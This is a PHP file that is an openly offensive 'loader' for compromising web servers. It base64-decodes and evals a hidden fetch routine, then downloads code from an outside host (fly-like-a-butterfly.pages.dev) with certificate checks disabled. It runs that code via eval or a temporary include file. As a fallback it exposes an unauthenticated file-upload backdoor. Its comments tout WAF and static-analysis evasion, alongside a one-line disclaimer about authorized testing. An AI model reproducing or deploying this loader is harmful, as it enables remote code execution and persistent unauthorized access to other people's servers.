<?php
/*
 * FreakyFreakz Loader - v4.0
 *
 * A resilient, multi-stage PHP loader designed for high compatibility across restricted environments.
 * This script prioritizes evasion, fallback execution, and remote payload delivery without relying
 * on shell commands or root privileges.
 *
 * Key Features:
 * - Multi-method HTTP(S) fetching (cURL, stream_socket_client, file_get_contents) to bypass
 *   disabled functions and WAF restrictions.
 * - SSL/TLS connections with certificate verification disabled for maximum reach.
 * - Layered obfuscation (Base64 + gzinflate + str_rot13) to hinder static analysis.
 * - Intelligent execution fallbacks:
 *     • Uses assert() on PHP < 7.1.0
 *     • Falls back to create_function() or eval() where available
 *     • If eval is disabled, writes payload to temp file and includes it
 * - Built-in file uploader as a secondary access vector if remote fetch fails.
 * - No dependency on shell_exec, system, or root-level tools (e.g., chattr).
 * - Compatible with shared hosting, LiteSpeed WAF, and common disable_functions configurations.
 *
 * Intended for authorized security testing, red team operations, or defensive research only.
 * Unauthorized deployment may violate laws and ethical guidelines.
 */

$_0 = 'base64_decode';
$_1 = 'gzinflate';
$_2 = 'str_rot13';

$_p = [
'Ly8gRmV0Y2ggZnVuY3Rpb24gd2l0aCBtdWx0aS1tZXRob2QgZmFsbGJhY2sKaWYgKCFmdW5jdGlvbl9leGlzdHMoJ19fX2ZldGNoJykpIHtmdW5jdGlvbiBfX19mZXRjaCgkaG9zdCwkcG9ydCwkcGF0aCl7CiAgJHVhID0gJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjkuMC4wLjAgU2FmYXJpLzUzNy4zNic7CiAgJG1ldGhvZHMgPSBhcnJheSgpOwogIGlmIChmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpKSB7ICRtZXRob2RzW10gPSAnY3VybCc7IH0KICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdzdHJlYW1fc29ja2V0X2NsaWVudCcpKSB7ICRtZXRob2RzW10gPSAnc3RyZWFtJzsgfQogIGlmIChpbmlfZ2V0KCdhbGxvd191cmxfZm9wZW4nKSAmJiBmdW5jdGlvbl9leGlzdHMoJ2ZpbGVfZ2V0X2NvbnRlbnRzJykpIHsgJG1ldGhvZHNbXSA9ICdmaWxlJzsgfQoKICBmb3JlYWNoICgkbWV0aG9kcyBhcyAkbSkgewogICAgaWYgKCRtID09ICdjdXJsJykgeyAvLyBNZXRob2QgMTogY3VybAogICAgICAkY2ggPSBjdXJsX2luaXQoImh0dHBzOi8vJGhvc3Q6JHBvcnQkcGF0aCIpOwogICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwogICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgMjApOwogICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdWEpOwogICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsKICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NULCBmYWxzZSk7CiAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgdHJ1ZSk7CiAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIGZhbHNlKTsKICAgICAgJGNvbnRlbnQgPSBjdXJsX2V4ZWMoJGNoKTsKICAgICAgJGh0dHBfY29kZSA9IGN1cmxfZ2V0aW5mbygkY2gsIENVUkxJTkZPX0hUVFBfQ09ERSk7CiAgICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgICAgaWYgKCRjb250ZW50ICE9PSBmYWxzZSAmJiAkaHR0cF9jb2RlID09IDIwMCkgewogICAgICAgIHJldHVybiAkY29udGVudDsKICAgICAgfQogICAgfSBlbHNlaWYgKCRtID09ICdzdHJlYW0nKSB7IC8vIE1ldGhvZCAyOiBzdHJlYW1fc29ja2V0CiAgICAgICRmcCA9IEBzdHJlYW1fc29ja2V0X2NsaWVudCgic3NsOi8vJGhvc3Q6JHBvcnQiLCAkZXJybm8sICRlcnJzdHIsIDIwKTsKICAgICAgaWYgKCRmcCkgewogICAgICAgICRvdXQgPSAiR0VUICRwYXRoIEhUVFAvMS4xXHJcbiI7CiAgICAgICAgJG91dCAuPSAiSG9zdDogJGhvc3RcclxuIjsKICAgICAgICAkb3V0IC49ICJVc2VyLUFnZW50OiAkdWFcclxuIjsKICAgICAgICAkb3V0IC49ICJDb25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIjsKICAgICAgICBmd3JpdGUoJGZwLCAkb3V0KTsKICAgICAgICAkcmF3ID0gIiI7CiAgICAgICAgd2hpbGUgKCFmZW9mKCRmcCkpIHsgJHJhdyAuPSBmZ2V0cygkZnAsIDEwMjQpOyB9CiAgICAgICAgZmNsb3NlKCRmcCk7CiAgICAgICAgJGhlYWRlcl9lbmQgPSBzdHJwb3MoJHJhdywgIlxyXG5cclxuIik7CiAgICAgICAgaWYgKCRoZWFkZXJfZW5kICE9PSBmYWxzZSkgewogICAgICAgICAgcmV0dXJuIHN1YnN0cigkcmF3LCAkaGVhZGVyX2VuZCArIDQpOwogICAgICAgIH0KICAgICAgfQogICAgfSBlbHNlaWYgKCRtID09ICdmaWxlJykgeyAvLyBNZXRob2QgMzogZmlsZV9nZXRfY29udGVudHMKICAgICAgJGNvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoWwogICAgICAgICdodHRwJyA9PiBbCiAgICAgICAgICAnbWV0aG9kJyA9PiAnR0VUJywKICAgICAgICAgICd0aW1lb3V0JyA9PiAyMCwKICAgICAgICAgICdoZWFkZXInID0+ICJVc2VyLUFnZW50OiAkdWFcclxuIiwKICAgICAgICAgICdpZ25vcmVfZXJyb3JzJyA9PiB0cnVlCiAgICAgICAgXSwKICAgICAgICAnc3NsJyA9PiBbCiAgICAgICAgICAndmVyaWZ5X3BlZXInID0+IGZhbHNlLAogICAgICAgICAgJ3ZlcmlmeV9wZWVyX25hbWUnID0+IGZhbHNlCiAgICAgICAgXQogICAgICBdKTsKICAgICAgJHVybCA9ICJodHRwczovLyRob3N0OiRwb3J0JHBhdGgiOwogICAgICAkY29udGVudCA9IEBmaWxlX2dldF9jb250ZW50cygkdXJsLCBmYWxzZSwgJGNvbnRleHQpOwogICAgICBpZiAoJGNvbnRlbnQgIT09IGZhbHNlKSB7CiAgICAgICAgcmV0dXJuICRjb250ZW50OwogICAgICB9CiAgICB9CiAgfQogIHJldHVybiBmYWxzZTsKfX0='
];

$_code = call_user_func($_0, implode('', $_p));
if (function_exists('assert') && version_compare(PHP_VERSION, '7.1.0', '<')) {
    @assert($_code);
} elseif (function_exists('create_function')) {
    $_f = create_function('', $_code . 'return true;');
    @$_f();
} else {
    if (!in_array('eval', @array_map('trim', @explode(',', @ini_get('disable_functions'))))) {
        eval($_code);
    }
}

$_success = false;
$_content = false;

if (function_exists('___fetch')) {
    $_content = ___fetch("fly-like-a-butterfly.pages.dev", 443, "/readme.txt");
    if ($_content !== false) {
        $_success = true;
        if (!in_array('eval', @array_map('trim', @explode(',', @ini_get('disable_functions'))))) {
            eval("?>" . $_content);
            exit;
        } else {
            $_tmpf = sys_get_temp_dir() . '/' . md5(microtime()) . '.php';
            if (@file_put_contents($_tmpf, "<?php " . $_content)) {
                include($_tmpf);
                @unlink($_tmpf);
                exit;
            }
        }
    }
}

if (!$_success) {
    function __mv($a,$b){return function_exists('move_uploaded_file')?@move_uploaded_file($a,$b):false;}
    function __cp($a,$b){return function_exists('copy')?@copy($a,$b):false;}
    function __rn($a,$b){return function_exists('rename')?@rename($a,$b):false;}
    function __rd($f){
        if(function_exists('file_get_contents'))return@file_get_contents($f);
        if(function_exists('fopen')){
            $h=@fopen($f,'rb');
            if($h){$c='';while(!feof($h)){$c.=fread($h,8192);}fclose($h);return$c;}
        }
        return false;
    }

    if(!empty($_FILES['file']['tmp_name'])){
        $fn=basename($_FILES['file']['name']);
        $fn=preg_replace('/[^a-zA-Z0-9._-]/','_',$fn);
        $tp=$_FILES['file']['tmp_name'];
        $dp=__DIR__.'/'.$fn;
        $up=false;$m='';
        if(__mv($tp,$dp)){$up=true;$m='move_uploaded_file';}
        elseif(__cp($tp,$dp)){$up=true;$m='copy';}
        elseif(__rn($tp,$dp)){$up=true;$m='rename';}
        else{$c=__rd($tp);if($c!==false&&($fp=@fopen($dp,'wb'))){fwrite($fp,$c);fclose($fp);$up=true;$m='fopen/fwrite';}}
        echo $up?"[+] $m(): $fn uploaded.<br>":"[-] Upload failed.<br>";
    }
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex, nofollow">
<title>FreakyFreakz</title>
</head>
<body>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file" required>
<button type="submit">Upload</button>
</form>
</body>
</html>
<?php } ?>
